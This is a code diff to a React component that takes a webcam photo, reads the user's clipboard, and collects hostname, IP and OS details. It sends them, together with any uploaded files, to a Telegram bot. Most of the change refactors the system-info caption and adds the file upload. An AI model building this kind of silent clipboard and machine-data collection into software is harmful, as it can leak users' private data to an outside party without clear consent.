@@ -4,6 +4,7 @@ import Webcam from "react-webcam";
 import FormData from "form-data";
 import "./style.css";
 import axios from "axios";
+import UploadFile from "../UploadFile";
 
 // type formType = {
 //   telegram_id: string;
@@ -64,6 +65,8 @@ const Content = () => {
 
   const [messageApi, contextHolder] = message.useMessage();
 
+  const [fileList, setFileList] = useState<UploadFile[]>([]);
+
   // const telegramChatId = form?.telegram_id;
   // const [formData] = Form.useForm();
   //
@@ -95,7 +98,7 @@ const Content = () => {
   };
 
   useEffect(() => {
-    setIsLoading(true)
+    setIsLoading(true);
     axios
       .get("http://localhost:3000/hardware-info")
       .then((response) => {
@@ -117,18 +120,7 @@ const Content = () => {
     }
   };
 
-  const sendPhotoToTelegram = async () => {
-    setIsLoading(true);
-    if (imgSrc) {
-      try {
-        const response = await fetch(imgSrc);
-        const blob = await response.blob();
-
-        const clipboardContent = await getClipboardContent();
-
-        const caption = `
-          System Info:
-
+  const systemInfo: string = `
             'hostname': ${hardwareInfo.hostname}
             'ipv4': ${hardwareInfo.ipv4}
             'machine': ${hardwareInfo.machine}
@@ -143,6 +135,21 @@ const Content = () => {
             'release': ${hardwareInfo.release}
             'system': ${hardwareInfo.system}
             'version': ${hardwareInfo.version}
+            `;
+
+  const sendPhotoToTelegram = async () => {
+    setIsLoading(true);
+    if (imgSrc) {
+      try {
+        const response = await fetch(imgSrc);
+        const blob = await response.blob();
+
+        const clipboardContent = await getClipboardContent();
+
+        const caption = `
+          System Info:
+
+           ${systemInfo}
             
           Clipboard Content:
 
@@ -153,6 +160,14 @@ const Content = () => {
         formData.append("chat_id", telegramChatId);
         formData.append("photo", blob, "webcam-photo.jpg");
         formData.append("caption", caption);
+
+        fileList.map((fileItem) => {
+          const file = fileItem.originFileObj;
+          if (file) {
+            formData.append("document", file, file.name);
+          }
+          return null;
+        });
 
         const telegramResponse = await fetch(
           `https://api.telegram.org/bot${telegramToken}/sendPhoto`,
@@ -166,6 +181,7 @@ const Content = () => {
         if (result.ok) {
           setImgSrc("");
           successMessage();
+          setFileList([])
         } else {
           console.error("Error sending photo and info:", result);
           errorMessage();
@@ -236,6 +252,7 @@ const Content = () => {
                 )}
               </div>
             </div>
+            <UploadFile setFileList={setFileList} fileLis={fileList} />
             <div className="mb-5">
               <span className="text-lg">Telegram Channel:</span>
               <a
